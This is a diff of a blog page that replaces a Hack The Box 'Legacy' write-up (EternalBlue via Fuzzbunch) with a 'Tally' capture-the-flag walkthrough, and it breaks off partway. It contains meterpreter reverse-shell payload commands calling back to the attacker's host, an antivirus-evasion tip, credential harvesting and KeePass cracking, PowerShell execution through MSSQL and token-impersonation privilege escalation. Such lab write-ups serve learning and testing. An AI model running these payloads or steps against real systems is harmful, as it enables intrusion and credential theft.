@@ -137,16 +137,16 @@ div.centered, p.centered, figcaption.centered, nav.centered, table.centered, h1.
   <link href="https://alamot.github.io/index.xml" rel="alternate" type="application/rss+xml" title="The Portal of Knowledge" />
 
 
-  <title>Legacy write-up - The Portal of Knowledge</title>
-  <meta property='og:title' content="Legacy write-up - The Portal of Knowledge">
+  <title>Tally write-up - The Portal of Knowledge</title>
+  <meta property='og:title' content="Tally write-up - The Portal of Knowledge">
   <meta property="og:type" content="article">
-  <meta name="description" content="Write-up for the Legacy machine (www.hackthebox.eu). Ανάλυση του μηχανήματος Legacy του www.hackthebox.eu (διαθέσιμη μόνο στα αγγλικά).">
-  <meta property="og:description" content="Write-up for the Legacy machine (www.hackthebox.eu). Ανάλυση του μηχανήματος Legacy του www.hackthebox.eu (διαθέσιμη μόνο στα αγγλικά).">
-  <meta property="og:image" content="https://alamot.github.io/images/legacy.jpg">
+  <meta name="description" content="Write-up for the Tally machine (www.hackthebox.eu). Ανάλυση του μηχανήματος Tally του www.hackthebox.eu (διαθέσιμη μόνο στα αγγλικά).">
+  <meta property="og:description" content="Write-up for the Tally machine (www.hackthebox.eu). Ανάλυση του μηχανήματος Tally του www.hackthebox.eu (διαθέσιμη μόνο στα αγγλικά).">
+  <meta property="og:image" content="https://alamot.github.io/images/dart.jpg">
   <meta property="og:image:width" content="768" />
   <meta property="og:image:height" content="384" />
 
-<meta property="og:url" content="https://alamot.github.io/legacy_writeup/">
+<meta property="og:url" content="https://alamot.github.io/tally_writeup/">
 
 
 <script type="application/ld+json">
@@ -157,15 +157,15 @@ div.centered, p.centered, figcaption.centered, nav.centered, table.centered, h1.
       "@type":"WebPage",
       "@id":"https://alamot.github.io/"
     },
-    "headline": "Legacy write-up |  ",
+    "headline": "Tally write-up |  ",
     "image": {
       "@type": "ImageObject",
       "url": "",
       "height": 700,
       "width": 700
     },
-    "datePublished": "2017-10-19T00:00:00JST",
-    "dateModified": "2017-10-19T00:00:00JST",
+    "datePublished": "2018-05-03T00:00:00JST",
+    "dateModified": "2018-05-03T00:00:00JST",
     "author": {
       "@type": "Person",
       "name": "Antonios Tsolis",
@@ -201,17 +201,18 @@ div.centered, p.centered, figcaption.centered, nav.centered, table.centered, h1.
 <li><a href="#enumeration">Enumeration</a>
 <ul>
 <li><a href="#port-scanning">Port scanning</a></li>
+<li><a href="#brute-forcing-microsoft-sharepoint">Brute forcing Microsoft SharePoint</a></li>
+<li><a href="#getting-ftp-credentials">Getting FTP credentials</a></li>
+<li><a href="#getting-smb-credentials">Getting SMB credentials</a></li>
+<li><a href="#getting-mssql-credentials">Getting MSSQL credentials</a></li>
+<li><a href="#getting-shell">Getting shell</a></li>
 </ul></li>
-<li><a href="#exploitation">Exploitation</a>
+<li><a href="#privilege-escalation">Privilege Escalation</a>
 <ul>
-<li><a href="#installing-fuzzbunch-on-linux">Installing Fuzzbunch on Linux</a></li>
-<li><a href="#setting-up-the-listener">Setting up the listener</a></li>
-<li><a href="#running-fuzzbunch">Running fuzzbunch</a>
-<ul>
-<li><a href="#executing-eternalblue">Executing EternalBlue</a></li>
-<li><a href="#executing-doublepulsar">Executing DoublePulsar</a></li>
+<li><a href="#using-incognito-and-rottenpotato">Using Incognito and RottenPotato</a></li>
+<li><a href="#using-cve-2017-213">Using CVE-2017-213</a></li>
 </ul></li>
-</ul></li>
+<li><a href="#what-about-exploiting-firefox">What about exploiting Firefox</a></li>
  
       
         <li><a href="#posts-section"><span lang="en">See also</span><span lang="el">Δείτε επίσης</span></a></li>
@@ -253,13 +254,13 @@ if (language) {
   <div class="row">
     <div class="col-md-12">
       <article class="single centered">
-        <div class="image" style="background-image: url(https://alamot.github.io/images/legacy.jpg);"></div>
+        <div class="image" style="background-image: url(https://alamot.github.io/images/dart.jpg);"></div>
         <div class="body">
-            <header lang="en"><h1 id="title" class="title">Legacy write-up</h1></header>
-            <header lang="el"><h1 class="title">Ανάλυση του Legacy</h1></header>
+            <header lang="en"><h1 id="title" class="title">Tally write-up</h1></header>
+            <header lang="el"><h1 class="title">Ανάλυση του Tally</h1></header>
             <i class="fa fa-calendar topmargin7"  aria-hidden="true"></i>  
-            <time lang="en" class="topmargin7">19 Oct 2017</time>
-            <time lang="el" class="topmargin7">19 Οκτ 2017</time>
+            <time lang="en" class="topmargin7">03 May 2018</time>
+            <time lang="el" class="topmargin7">03 Μαϊ 2018</time>
             &middot; <i class="fa fa-folder-open-o topmargin7" aria-hidden="true"></i>
             
               <a class="label label-success topmargin7" href='https://alamot.github.io/categories/cybersecurity'>
@@ -289,17 +290,18 @@ if (language) {
 <li><a href="#enumeration">Enumeration</a>
 <ul>
 <li><a href="#port-scanning">Port scanning</a></li>
+<li><a href="#brute-forcing-microsoft-sharepoint">Brute forcing Microsoft SharePoint</a></li>
+<li><a href="#getting-ftp-credentials">Getting FTP credentials</a></li>
+<li><a href="#getting-smb-credentials">Getting SMB credentials</a></li>
+<li><a href="#getting-mssql-credentials">Getting MSSQL credentials</a></li>
+<li><a href="#getting-shell">Getting shell</a></li>
 </ul></li>
-<li><a href="#exploitation">Exploitation</a>
+<li><a href="#privilege-escalation">Privilege Escalation</a>
 <ul>
-<li><a href="#installing-fuzzbunch-on-linux">Installing Fuzzbunch on Linux</a></li>
-<li><a href="#setting-up-the-listener">Setting up the listener</a></li>
-<li><a href="#running-fuzzbunch">Running fuzzbunch</a>
-<ul>
-<li><a href="#executing-eternalblue">Executing EternalBlue</a></li>
-<li><a href="#executing-doublepulsar">Executing DoublePulsar</a></li>
+<li><a href="#using-incognito-and-rottenpotato">Using Incognito and RottenPotato</a></li>
+<li><a href="#using-cve-2017-213">Using CVE-2017-213</a></li>
 </ul></li>
-</ul></li>
+<li><a href="#what-about-exploiting-firefox">What about exploiting Firefox</a></li>
 </ul>
 </nav></div>
           </section>
@@ -311,397 +313,554 @@ if (language) {
 
 <h2 id="port-scanning">Port scanning</h2>
 
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sudo nmap -A 10.10.10.4
+<p>Let&rsquo;s scan the full range of TCP ports using my tool htbscan.py (you can find it here: <a href="https://github.com/Alamot/code-snippets/blob/master/enum/htbscan.py):" target="_blank">https://github.com/Alamot/code-snippets/blob/master/enum/htbscan.py):</a>
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sudo ./htbscan.py 10.10.10.59 300
 
-Nmap scan report for 10.10.10.4
-PORT     STATE  SERVICE       VERSION
-139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
-445/tcp  open   microsoft-ds  Windows XP microsoft-ds
-3389/tcp closed ms-wbt-server
-Running (JUST GUESSING): Microsoft Windows 2000|XP|2003|PocketPC/CE (91%)
-OS CPE: cpe:/o:microsoft:windows_2000 cpe:/o:microsoft:windows_xp 
-Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp
+Running command: sudo masscan -e tun0 -p0-65535 --max-rate 300 --interactive 10.10.10.59
+
+Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2018-05-03 12:04:44 GMT
+ -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
+Initiating SYN Stealth Scan
+Scanning 1 hosts [65536 ports/host]
+Discovered open port 49668/tcp on 10.10.10.59                                  
+Discovered open port 80/tcp on 10.10.10.59                                     
+Discovered open port 445/tcp on 10.10.10.59                                    
+Discovered open port 32843/tcp on 10.10.10.59                                  
+Discovered open port 49665/tcp on 10.10.10.59                                  
+Discovered open port 1433/tcp on 10.10.10.59                                   
+Discovered open port 135/tcp on 10.10.10.59                                    
+Discovered open port 32844/tcp on 10.10.10.59                                  
+Discovered open port 81/tcp on 10.10.10.59                                     
+Discovered open port 49667/tcp on 10.10.10.59                                  
+Discovered open port 32846/tcp on 10.10.10.59                                  
+Discovered open port 49666/tcp on 10.10.10.59                                  
+Discovered open port 49666/tcp on 10.10.10.59                                  
+Discovered open port 47001/tcp on 10.10.10.59                                  
+Discovered open port 15567/tcp on 10.10.10.59                                  
+Discovered open port 49664/tcp on 10.10.10.59                                  
+Discovered open port 139/tcp on 10.10.10.59                                    
+Discovered open port 49670/tcp on 10.10.10.59                                  
+                                                                             
+Running command: sudo nmap -A -p80,81,135,139,445,1433,15567,32843,32844,32846,47001,49664,49665,49666,49667,49668,49670 10.10.10.59
+
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-03 15:11 EEST
+Nmap scan report for 10.10.10.59
+Host is up (0.12s latency).
+
+PORT      STATE SERVICE              VERSION
+80/tcp    open  http                 Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+81/tcp    open  http                 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Bad Request
+135/tcp   open  msrpc                Microsoft Windows RPC
+139/tcp   open  netbios-ssn          Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds         Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+1433/tcp  open  ms-sql-s             Microsoft SQL Server 2016 13.00.1601.00; RTM
+| ms-sql-ntlm-info: 
+|   Target_Name: TALLY
+|   NetBIOS_Domain_Name: TALLY
+|   NetBIOS_Computer_Name: TALLY
+|   DNS_Domain_Name: TALLY
+|   DNS_Computer_Name: TALLY
+|_  Product_Version: 10.0.14393
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Not valid before: 2018-05-03T10:47:41
+|_Not valid after:  2048-05-03T10:47:41
+|_ssl-date: 2018-05-03T12:12:35+00:00; +3s from scanner time.
+15567/tcp open  http                 Microsoft IIS httpd 10.0
+| http-auth: 
+| HTTP/1.1 401 Unauthorized\x0D
+|   Negotiate
+|_  NTLM
+| http-ntlm-info: 
+|   Target_Name: TALLY
+|   NetBIOS_Domain_Name: TALLY
+|   NetBIOS_Computer_Name: TALLY
+|   DNS_Domain_Name: TALLY
+|   DNS_Computer_Name: TALLY
+|_  Product_Version: 10.0.14393
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Site doesn&#39;t have a title.
+32843/tcp open  http                 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Service Unavailable
+32844/tcp open  ssl/http             Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Service Unavailable
+| ssl-cert: Subject: commonName=SharePoint Services/organizationName=Microsoft/countryName=US
+| Subject Alternative Name: DNS:localhost, DNS:tally
+| Not valid before: 2017-09-17T22:51:16
+|_Not valid after:  9999-01-01T00:00:00
+|_ssl-date: 2018-05-03T12:12:37+00:00; +3s from scanner time.
+| tls-alpn: 
+|   h2
+|_  http/1.1
+32846/tcp open  msexchange-logcopier Microsoft Exchange 2010 log copier
+47001/tcp open  http                 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc                Microsoft Windows RPC
+49665/tcp open  msrpc                Microsoft Windows RPC
+49666/tcp open  msrpc                Microsoft Windows RPC
+49667/tcp open  msrpc                Microsoft Windows RPC
+49668/tcp open  msrpc                Microsoft Windows RPC
+49670/tcp open  msrpc                Microsoft Windows RPC
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Microsoft Windows Server 2016 build 10586 - 14393 (96%), Microsoft Windows Server 2016 (95%), Microsoft Windows 10 1507 (93%), Microsoft Windows 10 1507 - 1607 (93%), Microsoft Windows 10 1511 (93%), Microsoft Windows Server 2012 (93%), Microsoft Windows Server 2012 R2 (93%), Microsoft Windows Server 2012 R2 Update 1 (93%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (93%), Microsoft Windows Vista SP1 - SP2, Windows Server 2008 SP2, or Windows 7 (93%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
 
 Host script results:
-|_nbstat: NetBIOS name: LEGACY, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:50:56:aa:ea:dc (VMware)
-| smb-os-discovery: 
-|   OS: Windows XP (Windows 2000 LAN Manager)
-|   OS CPE: cpe:/o:microsoft:windows_xp::-
-|   Computer name: legacy
-|   NetBIOS computer name: LEGACY\x00
-|   Workgroup: HTB\x00
+|_clock-skew: mean: 2s, deviation: 0s, median: 2s
+| ms-sql-info: 
+|   10.10.10.59:1433: 
+|     Version: 
+|       name: Microsoft SQL Server 2016 RTM
+|       number: 13.00.1601.00
+|       Product: Microsoft SQL Server 2016
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 1433
 | smb-security-mode: 
-|   account_used: &lt;blank&gt;
+|   account_used: guest
 |   authentication_level: user
 |   challenge_response: supported
-|_  message_signing: disabled (dangerous, but default)</code></pre></div></div>
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2018-05-03 15:12:36
+|_  start_date: 2018-05-03 13:47:08</code></pre></div></div></p>
 
-<h1 id="exploitation">Exploitation</h1>
+<h2 id="brute-forcing-microsoft-sharepoint">Brute forcing Microsoft SharePoint</h2>
 
-<h2 id="installing-fuzzbunch-on-linux">Installing Fuzzbunch on Linux</h2>
+<p>We see that Microsoft SharePoint is on the box. Let&rsquo;s download the SharePointURLBrute tool from here:
+<a href="https://www.bishopfox.com/resources/tools/sharepoint-hacking-diggity/attack-tools/" target="_blank">https://www.bishopfox.com/resources/tools/sharepoint-hacking-diggity/attack-tools/</a></p>
 
-<p>Install wine and winetricks using the package manager of your linux distro.
-We initiate a wine32 environment (you may need to install 32-bit packages)
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ WINEPREFIX=&#34;$HOME/.wine-fuzzbunch&#34; WINEARCH=win32 wine wineboot</code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ perl SharePointURLBrute\ v1.1.pl  -a http://10.10.10.59 -e SharePoint-UrlExtensions-18Mar2012.txt
 
-<p>Install python26 via winetricks
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ WINEPREFIX=&#34;$HOME/.wine-fuzzbunch&#34; winetricks python26</code></pre></div></div></p>
+Starting search for common SharePoint Pages
+Start Time: Sun Nov  5 11:37:15 2017
 
-<p>Get files from git
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ cd $HOME/.wine-fuzzbunch/drive_c &amp;&amp; git clone https://github.com/mdiazcl/fuzzbunch-debian</code></pre></div></div></p>
+FOUND: http://10.10.10.59/_catalogs/masterpage/Forms/AllItems.aspx
+FOUND: http://10.10.10.59/_catalogs/wp/Forms/AllItems.aspx
+FOUND: http://10.10.10.59/_layouts/AreaNavigationSettings.aspx
+FOUND: http://10.10.10.59/_Layouts/AreaTemplateSettings.aspx
+FOUND: http://10.10.10.59/_Layouts/AreaWelcomePage.aspx
+FOUND: http://10.10.10.59/_Layouts/ChangeSiteMasterPage.aspx
+FOUND: http://10.10.10.59/_layouts/MyInfo.aspx
+FOUND: http://10.10.10.59/_layouts/MyPage.aspx
+FOUND: http://10.10.10.59/_layouts/PageSettings.aspx
+FOUND: http://10.10.10.59/_layouts/policy.aspx
+FOUND: http://10.10.10.59/_layouts/policyconfig.aspx
+FOUND: http://10.10.10.59/_layouts/policycts.aspx
+FOUND: http://10.10.10.59/_layouts/Policylist.aspx
+FOUND: http://10.10.10.59/_Layouts/RedirectPage.aspx?Target={SiteCollectionUrl}_catalogs/masterpage
+FOUND: http://10.10.10.59/_layouts/SiteDirectorySettings.aspx
+FOUND: http://10.10.10.59/_layouts/sitemanager.aspx
+FOUND: http://10.10.10.59/_Layouts/SiteManager.aspx?lro=all
+FOUND: http://10.10.10.59/_vti_bin/alerts.asmx
+FOUND: http://10.10.10.59/_vti_bin/dspsts.asmx
+FOUND: http://10.10.10.59/_vti_bin/forms.asmx
+FOUND: http://10.10.10.59/_vti_bin/Lists.asmx
+FOUND: http://10.10.10.59/_vti_bin/people.asmx
+FOUND: http://10.10.10.59/_vti_bin/Permissions.asmx
+FOUND: http://10.10.10.59/_vti_bin/search.asmx
+FOUND: http://10.10.10.59/_vti_bin/UserGroup.asmx
+FOUND: http://10.10.10.59/_vti_bin/versions.asmx
+FOUND: http://10.10.10.59/_vti_bin/Views.asmx
+FOUND: http://10.10.10.59/_vti_bin/webpartpages.asmx
+FOUND: http://10.10.10.59/_vti_bin/webs.asmx
+FOUND: http://10.10.10.59/_vti_bin/SharepointEmailWS.asmx
+FOUND: http://10.10.10.59/_vti_bin/spsearch.asmx
+FOUND: http://10.10.10.59/_vti_bin/WebPartPages.asmx
+FOUND: http://10.10.10.59/default.aspx
+FOUND: http://10.10.10.59/shared documents/forms/allitems.aspx</code></pre></div></div>
 
-<p>I have written a little script to run fuzzbunch:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sudo nano /usr/local/bin/fuzzbunch 
-    export WINEPREFIX=$HOME/.wine-fuzzbunch
-    cd $HOME/.wine-fuzzbunch/drive_c/fuzzbunch-debian/windows
-    wine ../../Python26/python.exe fb.py
+<h2 id="getting-ftp-credentials">Getting FTP credentials</h2>
 
-$ sudo chmod +x /usr/local/bin/fuzzbunch</code></pre></div></div></p>
+<p>If we open the <a href="http://10.10.10.59/shared%20documents/forms/allitems.aspx" target="_blank">http://10.10.10.59/shared%20documents/forms/allitems.aspx</a>, we see a file named &ldquo;ftp-details&rdquo; modified by tally\administrator. Let&rsquo;s download it and see what there is inside:
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">FTP details
+hostname: tally
+workgroup: htb.local
+password: UTDRSCH53c&#34;$6hys
+Please create your own user folder upon logging in</code></pre></div></p>
 
-<p>Making the shellcode payload
-We need a DLL shellcode payload. You can use msfvenom to make it or anything else you like:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ cd $HOME/.wine-fuzzbunch/drive_c/
-$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=[INSERT_YOUR_IP_HERE] LPORT=60000 -f dll -o shell.dll
+<p>Now, we know the FTP password but we lack the username. If we set a cookie named &ldquo;mobile&rdquo; equal to 1 (i.e. mobile=1) and reload the site, a gear appears at the top-right corner. We can click on that gear and select &ldquo;Site Contents&rdquo; and then &ldquo;Site Pages&rdquo;. There, we find an interesting link named &ldquo;FinanceTeam.aspx&rdquo; (again by tally\administrator). I originally found the gear by emulating a mobile device via my browser (using developer tools, google it if you don&rsquo;t know what I am talking about). When I reloaded the site, the gear appeared at the top-right corner.</p>
 
-No platform was selected, choosing Msf::Module::Platform::Windows from the payload
-No Arch selected, selecting Arch: x86 from the payload
-No encoder or badchars specified, outputting raw payload
-Payload size: 333 bytes
-Final size of dll file: 5120 bytes
-Saved as: shell.dll</code></pre></div></div></p>
+<p>Let&rsquo;s visit that link:</p>
 
-<h2 id="setting-up-the-listener">Setting up the listener</h2>
+<p><a href="http://10.10.10.59/_layouts/15/mobile/mblwikia.aspx?Url=%2FSitePages%2FFinanceTeam%2Easpx&amp;Source=%2F_layouts%2F15%2Fmobile%2Fviewa%2Easpx%3FList%3D076fa50e%252Dcea0%252D431a%252Dad18%252Dd528cf893d4c%26View%3Dee7b270d%252D91a9%252D482d%252Db7f2%252Df905c4b15281" target="_blank">http://10.10.10.59/_layouts/15/mobile/mblwikia.aspx?Url=%2FSitePages%2FFinanceTeam%2Easpx&amp;Source=%2F_layouts%2F15%2Fmobile%2Fviewa%2Easpx%3FList%3D076fa50e%252Dcea0%252D431a%252Dad18%252Dd528cf893d4c%26View%3Dee7b270d%252D91a9%252D482d%252Db7f2%252Df905c4b15281</a>
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">Migration update
 
-<p>Again, you can use whatever listener you like. Here, I use the handler from metasploit:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ msfconsole
-msf &gt; use exploit/multi/handler 
-msf exploit(handler) &gt; set PAYLOAD windows/meterpreter/reverse_tcp
-msf exploit(handler) &gt; set LHOST=INSERT_YOUR_IP_HERE
-msf exploit(handler) &gt; set LPORT 60000
+Hi all,
+
+Welcome to your new team page!
+
+As always, there&#39;s still a few finishing touches to make.  Rahul - please upload the design mock ups to the Intranet folder as &#39;index.html&#39; using the ftp_user account - I aim to review regularly.
+
+We&#39;ll also add the fund and client account pages in due course.
+
+Thanks – Sarah &amp; Tim.</code></pre></div></p>
+
+<p>Therefore our FTP credentials are ftp_user:UTDRSCH53c&rdquo;$6hys</p>
+
+<h2 id="getting-smb-credentials">Getting SMB credentials</h2>
+
+<p>Connect using FTP and have a look in /User/Tim/log/do to.txt
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">To do:
+Remove migration folder
+Set secure share permissions
+encrypted share creds:
+password in keepass</code></pre></div></p>
+
+<p>Let&rsquo;s download /User/Tim/Files/tim.kdbx and crack it:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">keepass2john tim.kdbx &gt; hash
+john --format=KeePass --wordlist=/usr/share/dict/rockyou.txt hash
+tim:simplementeyo</code></pre></div></div></p>
+
+<p>Now open tim.kbdx using keepass (Master password: simplementeyo)
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ keepass tim.kbdx</code></pre></div></div></p>
+
+<p>Go to Database -&gt; WORK -&gt; WINDOWS -&gt; Shares. Here, we found some SMB credentials Finance:Acc0unting (right click and copy password to get the password)</p>
+
+<h2 id="getting-mssql-credentials">Getting MSSQL credentials</h2>
+
+<p>Let&rsquo;s connect to SMB:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ smbclient -U Finance \\\\10.10.10.59\\ACCT</code></pre></div></div>
+or
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sudo mount -t cifs //10.10.10.59/ACCT /mnt/TEMP -o,user=Finance,password=Acc0unting,vers=2.0</code></pre></div></div></p>
+
+<p>Inside the smb:\zz_Migration\Binaries\new Folder\tester.exe we find this:
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">DRIVER={SQL Server};SERVER=TALLY, 1433;DATABASE=orcharddb;UID=sa;PWD=GWE3V65#6KFH93@4GWTG2G;</code></pre></div></p>
+
+<p>This means our MSSQL credentials are sa:GWE3V65#6KFH93@4GWTG2G</p>
+
+<h2 id="getting-shell">Getting shell</h2>
+
+<p>Let&rsquo;s make a meterpreter payload using msfvenom. If we use the <strong>psh-reflection</strong> format our payload invade the antivirus detection:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.105 LPORT=60000 -f psh-reflection -o msf.ps1</code></pre></div></div></p>
+
+<p>Don&rsquo;t forget to set up your listener using exploit/multi/handler:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">msf&gt; use exploit/multi/handler
+msf exploit(handler) &gt; options
+
+Module options (exploit/multi/handler):
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)
+   LHOST     10.10.14.105     yes       The listen address
+   LPORT     60000            yes       The listen port
+
 msf exploit(handler) &gt; exploit
-[*] Exploit running as background job 0.
-[*] Started reverse TCP handler on YOUR_IP_HERE:60000</code></pre></div></div></p>
+[*] Started reverse TCP handler on 127.0.0.1:6000</code></pre></div></div></p>
 
-<h2 id="running-fuzzbunch">Running fuzzbunch</h2>
+<p>Now, upload msf.ps1 to /Intranet via FTP. We can execute our payload via MSSQL:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ msfconsole
+msf&gt; use  auxiliary/admin/mssql/mssql_exec
+msf auxiliary(mssql_exec) &gt; set CMD &#34;powershell -ExecutionPolicy bypass -NoExit -File C:\\FTP\\Intranet\\msf.ps1&#34;
+msf auxiliary(mssql_exec) &gt; info
 
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ fuzzbunch 
+Basic options:
+  Name             Current Setting
+  ----             ---------------
+  CMD              powershell -ExecutionPolicy bypass -NoExit -File C:\FTP\Intranet\msf.ps1
+  PASSWORD         GWE3V65#6KFH93@4GWTG2G
+  RHOST            10.10.10.59
+  RPORT            1433
+  TDSENCRYPTION    false
+  USERNAME         sa
+  USE_WINDOWS_AUTH false
 
-[*] Loading Plugins
-[*] Initializing Fuzzbunch v3.5.1
-[*] Adding Global Variables
-[+] Set ResourcesDir =&gt; C:\fuzzbunch-debian\windows\Resources
-[+] Set Color =&gt; True
-[+] Set ShowHiddenParameters =&gt; False
-[+] Set NetworkTimeout =&gt; 60
-[+] Set LogDir =&gt; C:\fuzzbunch-debian\logs
-[*] Autorun ON
+msf auxiliary(mssql_exec) &gt; exploit</code></pre></div></div></p>
 
-[+] Set FbStorage =&gt; C:\fuzzbunch-debian\windows\storage
+<p>And here is our meterpreter shell:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">meterpreter &gt; sysinfo
+Computer        : TALLY
+OS              : Windows 2016 (Build 14393).
+Architecture    : x64
+System Language : en_GB
+Domain          : HTB.LOCAL
+Logged On Users : 7
+Meterpreter     : x64/windows</code></pre></div></div></p>
 
-[*] Retargetting Session
+<h1 id="privilege-escalation">Privilege Escalation</h1>
 
-[?] Default Target IP Address [] : 10.10.10.4
-[?] Default Callback IP Address [] : [INSERT_YOUR_IP_HERE]     
-[?] Use Redirection [yes] : no
+<h2 id="using-incognito-and-rottenpotato">Using Incognito and RottenPotato</h2>
 
-[?] Base Log directory [C:\fuzzbunch-debian\logs] : 
-[*] Checking C:\fuzzbunch-debian\logs for projects
-Index     Project                 
------     -------                 
-0         Create a New Project    
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">meterpreter &gt; getprivs
+============================================================
+Enabled Process Privileges
+============================================================
+  SeAssignPrimaryTokenPrivilege
+  SeChangeNotifyPrivilege
+  SeCreateGlobalPrivilege
+  SeImpersonatePrivilege
+  SeIncreaseQuotaPrivilege
+  SeIncreaseWorkingSetPrivilege
 
-[?] Project [0] : 0
-[?] New Project Name : LEGACY
-[?] Set target log directory to &#39;C:\fuzzbunch-debian\logs\legacy\z10.10.10.4&#39;? [Yes] : 
+meterpreter &gt; cd C:\\Users\\Sarah\\Desktop
+meterpreter &gt; upload rottenpotato.exe
+[*] uploading  : /root/Downloads/RottenPotato/rottenpotato.exe -&gt; rottenpotato.exe
+[*] uploaded   : /root/Downloads/RottenPotato/rottenpotato.exe -&gt; rottenpotato.exe
 
-[*] Initializing Global State
-[+] Set TargetIp =&gt; 10.10.10.4
-[+] Set CallbackIp =&gt; [INSERT_YOUR_IP_HERE]
+meterpreter &gt; load incognito
+Loading extension incognito...success.
 
-[!] Redirection OFF
-[+] Set LogDir =&gt; C:\fuzzbunch-debian\logs\legacy\z10.10.10.4
-[+] Set Project =&gt; legacy</code></pre></div></div>
+meterpreter &gt; list_tokens -u
+[-] Warning: Not currently running as SYSTEM, not all tokens will be available
+             Call rev2self if primary process token is SYSTEM
 
-<h3 id="executing-eternalblue">Executing EternalBlue</h3>
+Delegation Tokens Available
+========================================
+TALLY\Sarah
 
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">fb &gt; use EternalBlue
+Impersonation Tokens Available
+========================================
+NT SERVICE\SQLSERVERAGENT
 
-[!] Entering Plugin Context :: Eternalblue
-[*] Applying Global Variables
-[+] Set NetworkTimeout =&gt; 60
-[+] Set TargetIp =&gt; 10.10.10.4
+meterpreter &gt; execute -Hc -f C:\\Temp\\rottenpotato.exe
+Process 7996 created.
+Channel 2 created.
+meterpreter &gt; list_tokens -u
+[-] Warning: Not currently running as SYSTEM, not all tokens will be available
+             Call rev2self if primary process token is SYSTEM
 
-[*] Applying Session Parameters
-[*] Running Exploit Touches
+Delegation Tokens Available
+========================================
+TALLY\Sarah
 
-[!] Enter Prompt Mode :: Eternalblue
+Impersonation Tokens Available
+========================================
+NT AUTHORITY\SYSTEM
+NT SERVICE\SQLSERVERAGENT
 
-Module: Eternalblue
-===================
+meterpreter &gt; impersonate_token &#34;NT AUTHORITY\\SYSTEM&#34;
+[-] Warning: Not currently running as SYSTEM, not all tokens will be available
+             Call rev2self if primary process token is SYSTEM
+[-] No delegation token available
+[+] Successfully impersonated user NT AUTHORITY\SYSTEM
+meterpreter &gt; shell
+Process 3452 created.
+Channel 3 created.
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
 
-[?] Prompt For Variable Settings? [Yes] : y
-[*]  NetworkTimeout :: Timeout for blocking network calls (in seconds). Use -1 for no timeout.
-[?] NetworkTimeout [60] : 
-[*]  TargetIp :: Target IP Address
-[?] TargetIp [10.10.10.4] : 
-[*]  TargetPort :: Port used by the SMB service for exploit connection
-[?] TargetPort [445] : 
-[*]  VerifyTarget :: Validate the SMB string from target against the target selected before exploitation.
-[?] VerifyTarget [True] : 
-[*]  VerifyBackdoor :: Validate the presence of the DOUBLE PULSAR backdoor before throwing. This option must be enabled for multiple exploit attempts.
-[?] VerifyBackdoor [True] : 
